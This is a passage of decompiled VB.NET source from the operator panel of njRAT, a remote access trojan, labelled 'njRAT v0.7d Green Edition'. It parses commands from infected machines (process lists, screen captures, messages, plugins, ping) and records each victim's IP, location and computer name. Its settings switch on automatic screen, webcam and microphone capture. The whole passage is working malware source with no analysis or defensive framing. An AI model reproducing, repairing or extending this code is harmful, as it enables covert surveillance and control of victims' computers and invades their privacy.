																																							array37(4) = array37(4).Remove(0, Strings.InStr(array37(4), text10, CompareMethod.Binary))
																																							flag5 = array37(4).StartsWith(" ")
																																							If flag5 Then
																																								array37(4) = array37(4).Remove(0, 1)
																																							End If
																																							listViewItem17.SubItems.Add(array37(4))
																																						Else
																																							listViewItem17.SubItems.Add(String.Empty)
																																						End If
																																						flag5 = Not flag6
																																						If flag5 Then
																																							listViewItem17.ForeColor = Color.GreenYellow
																																						End If
																																						flag5 = (Conversions.ToInteger(array37(1)) = manager9.PID)
																																						If flag5 Then
																																							listViewItem17.ForeColor = Color.Red
																																						End If
																																						list9.Add(listViewItem17)
																																						flag5 = (list9.Count > 10)
																																						If flag5 Then
																																							manager9.LPR.Items.AddRange(list9.ToArray())
																																							list9.Clear()
																																						End If
																																					Next
																																					flag5 = (list9.Count > 0)
																																					If flag5 Then
																																						manager9.LPR.Items.AddRange(list9.ToArray())
																																						list9.Clear()
																																					End If
																																					flag5 = manager9.PRFX
																																					If flag5 Then
																																						manager9.PRFX = False
																																						manager9.LPR.method_3()
																																					End If
																																					Dim columnHeader_3 As ColumnHeader = manager9.LPR.columnHeader_0
																																					flag5 = (columnHeader_3 Is Nothing)
																																					If flag5 Then
																																						manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(0))
																																					Else
																																						columnHeader_3.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", False)), "-", "+"), "-"))
																																						manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(columnHeader_3.Index))
																																					End If
																																				End If
																																				manager9.PRNXT = True
																																			End SyncLock
																																		Else
																																			flag5 = (Operators.CompareString(left9, "RM", False) = 0)
																																			If flag5 Then
																																				Dim num46 As Integer = 2
																																				Dim num47 As Integer = array2.Length - 1
																																				For num48 As Integer = num46 To num47
																																					manager9.LPR.Items.RemoveByKey(array2(num48))
																																				Next
																																			Else
																																				flag5 = (Operators.CompareString(left9, "ER", False) <> 0)
																																				If Not flag5 Then
																																					manager9.SL.Text = array2(2)
																																				End If
																																			End If
																																		End If
																																	End If
																																End SyncLock
																															End If
																														Else
																															flag5 = (Operators.CompareString(left, "lv", False) <> 0)
																															Dim flag7 As Boolean
																															If flag5 Then
																																flag2 = (Operators.CompareString(left, "ll", False) <> 0)
																																If flag2 Then
																																	flag = (Operators.CompareString(left, "P", False) = 0)
																																	If flag Then
																																		flag7 = (client.L Is Nothing OrElse client.L.Cells.Count <= Class7.int_10)
																																		If flag7 Then
																																			Return
																																		End If
																																		Dim online As Collection = Class7.form1_0.S.Online
																																		SyncLock online
																																			Dim dataGridViewCell As DataGridViewCell = client.L.Cells(Class7.int_10)
																																			Dim num49 As Integer = Conversions.ToInteger(array2(1))
																																			dataGridViewCell.Style.ForeColor = If((num49 <> 999), If((num49 < 500), If((num49 < 250), Color.LimeGreen, Color.LightGreen), Color.GreenYellow), Color.Orange)
																																			client.L.Cells(Class7.int_10).Value = array2(1) + "ms"
																																			Return
																																		End SyncLock
																																	End If
																																	flag7 = (Operators.CompareString(left, "bla", False) = 0)
																																	If flag7 Then
																																		client.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor
																																		Return
																																	End If
																																	flag7 = (Operators.CompareString(left, "~", False) = 0)
																																	If flag7 Then
																																		client.Send("~")
																																		Return
																																	End If
																																	flag7 = (Operators.CompareString(left, "MSG", False) = 0)
																																	If flag7 Then
																																		flag5 = Not Class7.class8_0.bool_5
																																		If flag5 Then
																																			Return
																																		End If
																																		Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.Lime), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.LimeGreen), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), vbCrLf, RuntimeHelpers.GetObjectValue(Color.Purple), "-->", RuntimeHelpers.GetObjectValue(Color.White), array2(1) })
																																		Return
																																	Else
																																		flag7 = (Operators.CompareString(left, "ER", False) = 0)
																																		If flag7 Then
																																			flag5 = Not Class7.class8_0.bool_4
																																			If flag5 Then
																																				Return
																																			End If
																																			Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.Lime), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.LimeGreen), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), vbCrLf, RuntimeHelpers.GetObjectValue(Color.Purple), "-->", RuntimeHelpers.GetObjectValue(Color.White), array2(1) + " " + array2(2) })
																																			Return
																																		Else
																																			flag7 = (Operators.CompareString(left, "pl", False) = 0)
																																			If flag7 Then
																																				Try
																																					client.plg.Remove(array2(1))
																																				Catch ex17 As Exception
																																				End Try
																																				flag7 = (Operators.CompareString(array2(2).ToString(), "0", False) = 0)
																																				If flag7 Then
																																					client.plg.Add(array2(1))
																																					Return
																																				End If
																																				Class7.smethod_2(client, Class7.smethod_0(Nothing, array2(1)), Conversions.ToBoolean(array2(2)))
																																				Return
																																			Else
																																				flag7 = (Operators.CompareString(left, "CAP", False) = 0)
																																				If flag7 Then
																																					Try
																																						client.lastPC = DateAndTime.Now
																																						client.Isend = False
																																						Dim array38 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
																																						flag7 = (array38.Length < 10)
																																						If flag7 Then
																																							Return
																																						End If
																																						client.L.Cells(0).Value = Image.FromStream(New MemoryStream(array38))
																																						Return
																																					Catch ex18 As Exception
																																						Return
																																					End Try
																																				End If
																																				Dim flag8 As Boolean
																																				If Operators.CompareString(left, "act", False) = 0 AndAlso client.L IsNot Nothing Then
																																					If Operators.CompareString(client.lastAC, array2(1), False) <> 0 Then
																																						flag8 = False
																																						GoTo IL_518E
																																					End If
																																				End If
																																				flag8 = True
																																				IL_518E:
																																				flag7 = flag8
																																				If flag7 Then
																																					Return
																																				End If
																																				client.lastAC = array2(1)
																																				Dim online2 As Collection = Class7.form1_0.S.Online
																																				SyncLock online2
																																					client.L.Cells(Class7.int_11).Value = Class6.smethod_16(array2(1))
																																					Return
																																				End SyncLock
																																			End If
																																		End If
																																	End If
																																End If
																															End If
																															Try
																																flag7 = (client.L IsNot Nothing)
																																If flag7 Then
																																	Class7.form1_0.L1.method_9(client.L)
																																End If
																																Dim list10 As List(Of Object) = New List(Of Object)()
																																list10.Add(Resources.JPEG)
																																list10.Add(Class6.smethod_16(array2(1)))
																																list10.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)(0))
																																Dim num50 As Integer = 2
																																Dim num51 As Integer = array2.Length - 2
																																For num52 As Integer = num50 To num51
																																	Dim num53 As Integer = num52 + 1
																																	flag7 = (num53 = Class7.int_11 - 1)
																																	If flag7 Then
																																		client.lastAC = array2(num52)
																																		list10.Add(Class6.smethod_16(array2(num52)))
																																	Else
																																		flag7 = (num53 = Class7.int_5)
																																		If flag7 Then
																																			list10.Add(client.COI)
																																			list10.Add(client.CName)
																																		Else
																																			list10.Add(array2(num52))
																																		End If
																																	End If
																																Next
																																client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10(Class7.int_2)), "_")), RuntimeHelpers.GetObjectValue(list10(Class7.int_3)))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary).Length - 1))))
																																Dim text11 As String = "\/<>?*:|"""
																																Dim num54 As Integer = 0
																																Dim length As Integer = text11.Length
																																While num54 < length
																																	Dim text12 As String = Conversions.ToString(text11(num54))
																																	client.Folder = client.Folder.Replace(text12, "%" + Conversion.Hex(Strings.Asc(text12)))
																																	num54 += 1
																																End While
																																client.Folder = Application.StartupPath + "\nj_users\" + client.Folder + "\"
																																client.L = Class7.form1_0.L1.method_8(client.ip(), list10.ToArray())
																																client.L.Tag = client
																																list10.Clear()
																																client.plg.AddRange(Strings.Split(array2(array2.Length - 1), ",", -1, CompareMethod.Binary))
																															Catch ex19 As Exception
																															End Try
																															flag7 = Class7.class8_0.bool_1
																															If flag7 Then
																																Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.Lime), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.LimeGreen), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), RuntimeHelpers.GetObjectValue(Color.DarkBlue), "Ready" })
																															End If
																															flag7 = Not Class7.class8_0.bool_0
																															If Not flag7 Then
																																Class7.notf_0.AddItem(client.COI, String.Format(Resources.notf, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_2).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_3).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_7).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_6).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_9).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_0).Value))), client.ip().Split(New Char() { ":"c })(0) }))
																															End If
																														End If
																													End If
																												End If
																											End If
																										End If
																									End If
																								End If
																							End If
																						End If
																					End If
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
			Catch ex20 As Exception
				Dim ex21 As Exception = ex20
				Dim flag7 As Boolean = Operators.CompareString(array2(0), "up", False) = 0 Or Operators.CompareString(array2(0), "dw", False) = 0
				If flag7 Then
					Try
						client.Send("close" + Class7.string_1 + array2(1))
					Catch ex22 As Exception
					End Try
				Else
					flag7 = (Operators.CompareString(array2(0).ToLower(), "cap", False) = 0)
					If flag7 Then
						client.Isend = False
					End If
					flag7 = Class7.class8_0.bool_3
					If flag7 Then
						Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.Lime), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.Lime), "Listner", RuntimeHelpers.GetObjectValue(Color.DarkRed), "ERR AT ", RuntimeHelpers.GetObjectValue(Color.White), array2(0), RuntimeHelpers.GetObjectValue(Color.Red), ex21.Message })
					End If
				End If
			End Try
		End Sub

		' Token: 0x0600057A RID: 1402 RVA: 0x00141340 File Offset: 0x0013F740
		Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
			target = value
			Return value
		End Function

		' Token: 0x0400028A RID: 650
		Public class8_0 As Class7.Class8 = New Class7.Class8()

		' Token: 0x0400028B RID: 651
		Public string_0 As String = "njRAT v0.7d Green Edition By im523"

		' Token: 0x0400028C RID: 652
		Public sk_0 As SK

		' Token: 0x0400028D RID: 653
		Public long_0 As Long = 0L

		' Token: 0x0400028E RID: 654
		Public long_1 As Long = 0L

		' Token: 0x0400028F RID: 655
		Public string_1 As String = "|'|'|"

		' Token: 0x04000290 RID: 656
		Public form1_0 As Form1

		' Token: 0x04000291 RID: 657
		Public int_0 As Integer = 1

		' Token: 0x04000292 RID: 658
		Public int_1 As Integer = 2

		' Token: 0x04000293 RID: 659
		Public int_2 As Integer = 3

		' Token: 0x04000294 RID: 660
		Public int_3 As Integer = 4

		' Token: 0x04000295 RID: 661
		Public int_4 As Integer = 5

		' Token: 0x04000296 RID: 662
		Public int_5 As Integer = 6

		' Token: 0x04000297 RID: 663
		Public int_6 As Integer = 7

		' Token: 0x04000298 RID: 664
		Public int_7 As Integer = 8

		' Token: 0x04000299 RID: 665
		Public int_8 As Integer = 9

		' Token: 0x0400029A RID: 666
		Public int_9 As Integer = 10

		' Token: 0x0400029B RID: 667
		Public int_10 As Integer = 11

		' Token: 0x0400029C RID: 668
		Public int_11 As Integer = 12

		' Token: 0x0400029D RID: 669
		Public list_0 As List(Of String) = New List(Of String)()

		' Token: 0x0400029E RID: 670
		Public list_1 As List(Of Class7.Class9) = New List(Of Class7.Class9)()

		' Token: 0x0400029F RID: 671
		Public notf_0 As notf = New notf()

		' Token: 0x040002A0 RID: 672
		Private list_2 As List(Of Client) = New List(Of Client)()

		' Token: 0x040002A1 RID: 673
		Public gclass3_0 As GClass3 = New GClass3(Application.StartupPath + "\GeoIP.dat", 1)

		' Token: 0x040002A2 RID: 674
		Public waveOut_0 As WaveOut

		' Token: 0x040002A3 RID: 675
		Public waveOut_1 As WaveOut

		' Token: 0x040002A4 RID: 676
		Public bool_0 As Boolean = True

		' Token: 0x0200002A RID: 42
		Public NotInheritable Class Class8
			' Token: 0x0600057B RID: 1403 RVA: 0x0014135C File Offset: 0x0013F75C
			<DebuggerNonUserCode()>
			Public Sub New()
			End Sub

			' Token: 0x0600057C RID: 1404 RVA: 0x00141368 File Offset: 0x0013F768
			Public Sub method_0()
				Me.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"))
				Me.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"))
				Me.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"))
				Me.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"))
				Me.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"))
				Me.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"))
				Me.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"))
				Me.bool_9 = Conversions.ToBoolean(Class6.smethod_2("snd", "TRUE"))
				Me.string_0 = Class6.smethod_2("SCI", "5")
				Me.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"))
				Me.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"))
				Me.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"))
				Me.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"))
				Me.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"))
			End Sub

			' Token: 0x0600057D RID: 1405 RVA: 0x001414E0 File Offset: 0x0013F8E0
			Public Sub method_1()
				Class6.smethod_3("ShowAlert", Me.bool_0.ToString())
				Class6.smethod_3("snd", Me.bool_9.ToString())
				Class6.smethod_3("LOGLOGIN", Me.bool_1.ToString())
				Class6.smethod_3("LOGCONNECTIONS", Me.bool_2.ToString())
				Class6.smethod_3("LOGLERR", Me.bool_3.ToString())
				Class6.smethod_3("LOGRERR", Me.bool_4.ToString())
				Class6.smethod_3("LOGMSGS", Me.bool_5.ToString())
				Class6.smethod_3("SCAUT", Me.bool_6.ToString())
				Class6.smethod_3("SCI", Me.string_0.ToString())
				Class6.smethod_3("CAMAUT", Me.bool_7.ToString())
				Class6.smethod_3("CAMI", Me.int_0.ToString())
				Class6.smethod_3("MICAUT", Me.bool_8.ToString())
				Class6.smethod_3("MICI", Me.int_1.ToString())
				Class6.smethod_3("scri", Me.int_2.ToString())
			End Sub

			' Token: 0x040002A5 RID: 677
			Public bool_0 As Boolean

			' Token: 0x040002A6 RID: 678
			Public bool_1 As Boolean

			' Token: 0x040002A7 RID: 679
			Public bool_2 As Boolean

			' Token: 0x040002A8 RID: 680
			Public bool_3 As Boolean

			' Token: 0x040002A9 RID: 681
			Public bool_4 As Boolean

			' Token: 0x040002AA RID: 682
			Public bool_5 As Boolean

			' Token: 0x040002AB RID: 683
			Public bool_6 As Boolean

			' Token: 0x040002AC RID: 684
			Public string_0 As String

			' Token: 0x040002AD RID: 685
			Public bool_7 As Boolean

			' Token: 0x040002AE RID: 686
			Public int_0 As Integer

			' Token: 0x040002AF RID: 687
			Public bool_8 As Boolean

			' Token: 0x040002B0 RID: 688
			Public int_1 As Integer

			' Token: 0x040002B1 RID: 689
			Public int_2 As Integer

			' Token: 0x040002B2 RID: 690
			Public bool_9 As Boolean
		End Class

		' Token: 0x0200002B RID: 43
		Public NotInheritable Class Class9
			' Token: 0x0600057E RID: 1406 RVA: 0x00141624 File Offset: 0x0013FA24
			Public Sub New(string_2 As String)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\plugin\" + string_2)
				Dim flag As Boolean = True
				Dim flag2 As Boolean = flag
				Me.byte_0 = Class6.smethod_8(array, flag2)
				Me.string_0 = string_2
				Me.string_1 = Class6.smethod_5(Me.byte_0)
			End Sub

			' Token: 0x040002B3 RID: 691
			Public byte_0 As Byte()

			' Token: 0x040002B4 RID: 692
			Public string_0 As String

			' Token: 0x040002B5 RID: 693
			Public string_1 As String
		End Class

		' Token: 0x0200002C RID: 44
		' (Invoke) Token: 0x06000582 RID: 1410
		Public Delegate Sub Delegate0(object_0 As Object)
	End Module
End Namespace
